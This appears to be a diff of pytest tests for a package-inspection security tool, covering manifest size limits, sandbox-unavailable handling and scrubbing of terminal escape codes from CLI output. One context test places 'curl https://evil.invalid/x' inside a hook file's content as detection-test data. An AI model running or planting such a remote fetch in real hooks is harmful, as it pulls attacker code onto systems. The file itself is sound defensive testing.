@@ -130,15 +130,103 @@ def test_verify_build_without_a_manifest_names_the_handoff(monkeypatch):
     assert "build" in result["reason"]
 
 
-def test_read_manifest_rejects_a_non_array(tmp_path):
-    import pytest as _pytest
-
+def test_read_manifest_returns_raw_text(tmp_path):
     from trustsight.cli.inspect.commands import _read_manifest
 
     path = tmp_path / "manifest.json"
-    path.write_text('{"path": "/usr/bin/x"}', encoding="utf-8")
-    with _pytest.raises(Exception):
-        _read_manifest(str(path))
+    text = '{"path": "/usr/bin/x"}'
+    path.write_text(text, encoding="utf-8")
+    assert _read_manifest(str(path)) == text
+
+
+def test_bounded_manifest_caps_entries_and_findings(monkeypatch):
+    from trustsight.analysis import artifact
+
+    monkeypatch.setattr(artifact, "MAX_MANIFEST_ENTRIES", 2)
+    monkeypatch.setattr(artifact, "MAX_FINDINGS", 2)
+    result = artifact.inspect_manifest_bounded([
+        {"path": "/usr/bin/a", "setuid": True},
+        {"path": "/usr/bin/b", "setuid": True},
+        {"path": "/usr/bin/c", "setuid": True},
+    ])
+    assert len(result["findings"]) == 2
+    assert result["limits"]["truncated"] is True
+    assert "manifest entries" in result["limits"]["reasons"]
+
+
+def test_bounded_manifest_caps_links(monkeypatch):
+    from trustsight.analysis import artifact
+
+    monkeypatch.setattr(artifact, "MAX_LINKS_PER_ENTRY", 2)
+    result = artifact.inspect_manifest_bounded([{
+        "path": "/usr/bin/app",
+        "links": ["liba.so", "libb.so", "libevil.so"],
+    }], {"depends": ["liba", "libb"]})
+    assert result["findings"] == []
+    assert result["limits"]["truncated"] is True
+    assert "links" in result["limits"]["reasons"]
+
+
+def test_bounded_manifest_declared_text_cap_skips_a004(monkeypatch):
+    from trustsight.analysis import artifact
+
+    monkeypatch.setattr(artifact, "MAX_DECLARED_TEXT_BYTES", 4)
+    result = artifact.inspect_manifest_bounded([], {
+        "install_text": "one!!!",
+        "built_install_text": "two!!!",
+    })
+    assert {f["rule_id"] for f in result["findings"]} == set()
+    assert "declared text" in result["limits"]["reasons"]
+
+
+def test_bounded_manifest_marks_truncated_content(monkeypatch):
+    from trustsight.analysis import artifact
+
+    monkeypatch.setattr(artifact, "MAX_CONTENT_BYTES", 4)
+    result = artifact.inspect_manifest_bounded([
+        {"path": "/etc/x.hook", "content": "Operation = *\nExec = evil\n"},
+    ])
+    assert result["limits"]["truncated"] is True
+    assert "content bytes" in result["limits"]["reasons"]
+
+
+def test_verify_build_partial_surfaces_limits(monkeypatch):
+    monkeypatch.setattr(
+        "trustsight.config.load_config", lambda: {"verify": {"enabled": True}})
+    from trustsight.sandbox import manifest_client
+
+    monkeypatch.setattr(
+        manifest_client, "inspect_artifact_manifest",
+        lambda **kwargs: {
+            "findings": [],
+            "limits": {"truncated": True, "reasons": ["manifest entries"]},
+        })
+    from trustsight.api import TrustSight
+
+    result = TrustSight(auto_import_seed=False).verify_build(
+        "demo", manifest=[{"path": "/usr/bin/x"}], static_clean=True)
+    assert result["status"] == "l9_partial"
+    assert result["truncated"] is True
+    assert result["limits"]["reasons"] == ["manifest entries"]
+    assert "l9_divergence" not in result
+
+
+def test_verify_build_sandbox_unavailable_is_named(monkeypatch):
+    monkeypatch.setattr(
+        "trustsight.config.load_config", lambda: {"verify": {"enabled": True}})
+    from trustsight.sandbox import manifest_client
+
+    def unavailable(**kwargs):
+        raise manifest_client.ManifestUnavailable("sandbox refused")
+
+    monkeypatch.setattr(
+        manifest_client, "inspect_artifact_manifest", unavailable)
+    from trustsight.api import TrustSight
+
+    result = TrustSight(auto_import_seed=False).verify_build(
+        "demo", manifest=[{"path": "/usr/bin/x"}])
+    assert result["status"] == "l9_unavailable"
+    assert "sandbox" in result["reason"]
 
 
 def test_verify_build_cli_passes_a_manifest(monkeypatch, tmp_path):
@@ -287,3 +375,33 @@ def test_a013_does_not_fire_on_a_symlink_only_rule():
 def test_content_beyond_the_cap_is_not_scanned():
     content = "x" * (64 * 1024) + " curl https://evil.invalid/x"
     assert "A012" not in _ids([{"path": "/etc/x.hook", "content": content}])
+
+
+def test_verify_build_cli_reports_partial_and_cleans_output(monkeypatch, tmp_path):
+    from typer.testing import CliRunner
+
+    from trustsight.api import TrustSight
+    from trustsight.cli import app
+
+    manifest = tmp_path / "manifest.json"
+    manifest.write_text('[{"path": "/usr/bin/x"}]', encoding="utf-8")
+    monkeypatch.setattr(
+        "trustsight.config.load_config",
+        lambda: {"verify": {"enabled": True}})
+    monkeypatch.setattr(
+        "trustsight.cli.inspect.commands.analyze_package",
+        lambda *a, **k: (_ for _ in ()).throw(RuntimeError("offline")))
+    monkeypatch.setattr(
+        TrustSight, "verify_build",
+        lambda self, package, **kwargs: {
+            "status": "l9_partial",
+            "findings": [{"rule_id": "A001", "match": "\x1b[31mevil\x1b[0m"}],
+            "limits": {"reasons": ["\x1b[31mmanifest entries\x1b[0m"]},
+            "truncated": True,
+        })
+
+    result = CliRunner().invoke(
+        app, ["verify-build", "demo", "--manifest", str(manifest)])
+    assert result.exit_code == 0, result.stdout
+    assert "L9 inspection truncated" in result.stdout
+    assert "\x1b" not in result.stdout
